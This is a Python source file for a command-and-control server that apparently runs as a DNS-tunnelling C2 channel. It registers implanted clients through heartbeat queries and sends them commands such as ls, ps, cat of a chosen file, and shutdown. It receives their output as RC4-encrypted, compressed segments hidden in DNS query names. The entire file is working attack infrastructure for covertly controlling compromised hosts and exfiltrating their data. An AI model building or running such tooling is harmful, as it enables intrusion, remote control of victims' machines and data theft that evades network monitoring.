import datetime
import re
import signal
import sys
import threading
import zlib
from arc4 import ARC4
from argparse import ArgumentParser
from typing import Any, Dict

from dnslib import *

from shared import client_to_serv, serv_to_client, get_request_name


class Command:
    def __init__(self, addr):
        self.addr = addr
        self.completed = True
        """ Whether this command has been completed """

        self.started = False
        """ Whether the client knows we want this command to be executed. Waiting for reply """

        self.arg = []
        self.segments = []
        self.command = None

    def start(self):
        self.completed = False
        self.started = True
        self.segments = []

    def add_segment(self, data):
        self.segments.append(data)

    def set_command(self, command, arg=None):
        self.command = command
        self.arg = arg
        self.completed = False


class Server:

    def __init__(self, args):
        self.password = args.password
        self.silent = args.silent
        self.listening_port = args.port
        self.listening_ip = args.ip

        self.connected_clients = {}
        self.commands_for_clients: Dict[Any, Command] = {}
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind((self.listening_ip, self.listening_port))
        self.socket.settimeout(10)

        self.__log("Started listening on port: {}, ip: {}".format(self.listening_port, self.listening_ip))
        self.running = False

    def __log(self, message):
        if self.silent:
            return
        print("CCS: {}".format(message))

    def run(self):
        if self.running:
            self.__log("Already running...")
            return
        self.running = True

        while self.running:
            try:
                data, addr = self.socket.recvfrom(1024)
                request = DNSRecord.parse(data)

            except Exception:
                self.__log("No valid input...")
                continue

            n = get_request_name(request.get_q().get_qname())
            self.__log("{}: Got request: {}".format(addr, n))
            if request.get_q().get_qname().matchGlob(client_to_serv["HB"]):
                # It is a heartbeat..
                self.__log("{}: Heartbeat".format(addr))
                repl = self.heartbeat_reply(request.reply(), addr)

            elif request.get_q().get_qname().matchSuffix(client_to_serv["RESP"]):
                # It is a reply for our request:
                self.__log("{}: We got a response for our request!".format(addr))
                repl = self.extract_data_from_request(request, addr)

            elif request.get_q().get_qname().matchGlob(client_to_serv["DONE"]):
                # The client has finished sending us data...
                self.__log("{}: Finished request".format(addr))
                repl = self.finished_stream(request, addr)

            else:
                self.__log("{}: ERROR: Got unknown packet, that violates the protocol! Ignoring...".format(addr))
                return

            self.socket.sendto(bytes(repl.pack()), addr)

    def finished_stream(self, request, addr):
        if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
            self.__log("{}: ERROR: Got a protocol-violated message! Sending reset signal...".format(addr))
            command = serv_to_client["RST"]

        else:
            self.__log(
                "{}: Finished receiving stream for command: {}".format(addr, self.commands_for_clients[addr].command))
            command = serv_to_client["ACK"]
            self.commands_for_clients[addr].completed = True

            if not self.decrypt_segments(addr):
                self.__log("Decrypting segments failed. Sending RST error signal")
                command = serv_to_client["RST"]
                self.commands_for_clients[addr].completed = False
                self.commands_for_clients[addr].segments = []

        repl = request.reply()
        repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))

        return repl

    def decrypt_segments(self, addr) -> bool:
        """
        Attempts to decrypt segments
        :return: Whether the decryption was successful
        """
        try:
            segments_edited = [(re.sub("{}\.$".format(client_to_serv["RESP"]), "", i).replace(".", ""))
                               for i in self.commands_for_clients[addr].segments]
            flattened = bytes("".join(segments_edited), "utf-8")
            flattened_replaced = flattened.replace(b"_", b"/").replace(b"-", b"+")
            replaced_padded = flattened_replaced + b"=" * ((4 - len(flattened_replaced) % 4) % 4)
            decoded = base64.b64decode(replaced_padded)
            deciphered = ARC4(self.password).decrypt(decoded)
            uncompressed = zlib.decompress(deciphered)
            self.commands_for_clients[addr].segments = uncompressed.decode("utf-8")
        except Exception as e:
            print("Error while processing data from {}: {}".format(addr, e))
            return False
        return True

    def extract_data_from_request(self, request, addr):
        if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
            self.__log("{}: ERROR: Got a protocol-violated message! Sending reset signal...".format(addr))
            command = serv_to_client["RST"]
        else:
            self.__log("{}: Got data segment for command: {}".format(addr, self.commands_for_clients[addr].command))

            qname = str(request.get_q().get_qname())
            self.commands_for_clients[addr].add_segment(qname)

            command = serv_to_client["ACK"]

        repl = request.reply()
        repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
        return repl

    def heartbeat_reply(self, request, addr):
        new_one = addr not in self.connected_clients
        self.connected_clients[addr] = datetime.datetime.now()

        if new_one:
            # We register a new client
            print("New client {} registered!".format(addr))
            self.commands_for_clients[addr] = Command(addr)
            command = "ACK"

        elif self.commands_for_clients[addr].completed:
            # We do not have any commands for this machine
            command = "NOP"

        else:
            # We have job for you!
            if self.commands_for_clients[addr].started:
                self.__log(
                    "{}: ERROR: The client has sent us a Heartbeat, while it was supposed to send a reply!".format(
                        addr))
                self.commands_for_clients[addr].started = False
                command = "RST"
            else:
                self.commands_for_clients[addr].start()
                command = self.commands_for_clients[addr].command

        # Sanity check
        if command is None:
            self.__log("{}: Cannot reply with None message!".format(addr))
            return

        reply = request.reply()
        self.__log("{}: Sending {} command...".format(addr, command))
        reply.add_answer(RR(client_to_serv["HB"], QTYPE.A, rdata=A(serv_to_client[command]), ttl=60))
        return reply

    def cleanup_connected(self):
        """
        Removes all inactive clients from the client list
        """
        addresses = list(self.connected_clients.keys())
        for i in addresses:
            # TODO: Change back to 200
            if abs((datetime.datetime.now() - self.connected_clients[i]).total_seconds()) > 20:
                print("Cleaning up client {} because of inactivity".format(i))
                del self.connected_clients[i]
                del self.commands_for_clients[i]

    def next_command(self):
        """
        Instruction for the Server object to get and answer a new command from the user. 
        """

        for addr in self.commands_for_clients:
            if self.commands_for_clients[addr].completed and self.commands_for_clients[addr].started and type(
                    self.commands_for_clients[addr].segments) == str:
                print("Reply from {} for request: {}:".format(addr, self.commands_for_clients[addr].command))
                print(self.commands_for_clients[addr].segments)
                self.commands_for_clients[addr].started = False

        try:
            if len(self.connected_clients) == 0:
                print("No clients connected.")
                time.sleep(5)
                return

            self.cleanup_connected()
            print("\n================")
            # Select IP to give commands to:
            print("0: Rescan")
            addresses = list(self.connected_clients.keys())
            for i in range(len(addresses)):
                print("{}: {} {}".format(i + 1, addresses[i],
                                         "" if self.commands_for_clients[addresses[i]].completed else "- BUSY"))

            selected_ip = int(input("Select your target: \n================\n"))
            if selected_ip == 0:
                return
            else:
                # Compensate for the rescan option
                selected_ip -= 1
            tar_addr = list(self.connected_clients.keys())[selected_ip]

            print("\n================")
            # Select command:
            print("1: ls")
            print("2: w")
            print("3: ps")
            print("4: cat")
            print("5: nop")
            print("6: shutdown")
            print("7: exit")

            command = int(input("Command number: \n================\n"))
            argument = None

            if command == 1:
                command = "LS"
            elif command == 2:
                command = "W"
            elif command == 3:
                command = "PS"
            elif command == 4:
                command = "CAT"
                argument = input("Enter argument: ")
            elif command == 5:
                return
            elif command == 6:
                command = "SD"
                argument = input("Enter argument: ")
            elif command == 7:
                self.running = False
                return

            self.commands_for_clients[tar_addr].set_command(command, argument)

        except Exception as e:
            print("Invalid input! {}".format(e), file=sys.stderr)


class Worker:
    def __init__(self, server: Server):
        self.thread = threading.Thread(target=server.run, args=())
        self.thread.daemon = True
        self.server = server

    def start(self):
        self.thread.start()

    def stop(self):
        print("Stopping daemon...")
        self.server.running = False
        self.thread.join()


def signal_handler(sig, frame, worker):
    print('You pressed Ctrl+C!')
    worker.stop()
    sys.exit(0)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-pass", "--password", help="The password used to encrypt the communication", type=str,
                        default="heslo")
    parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
    parser.add_argument("-ip", "--ip", help="Server IP", type=str, default="127.0.0.1")
    parser.add_argument("-p", "--port", help="Port for the server to run on", type=int,
                        default=51271)  # TODO: Arbitrary...
    args = parser.parse_args()

    server = Server(args)
    worker = Worker(server)
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame, worker))

    worker.start()

    while server.running:
        server.next_command()
        time.sleep(1)

    worker.stop()
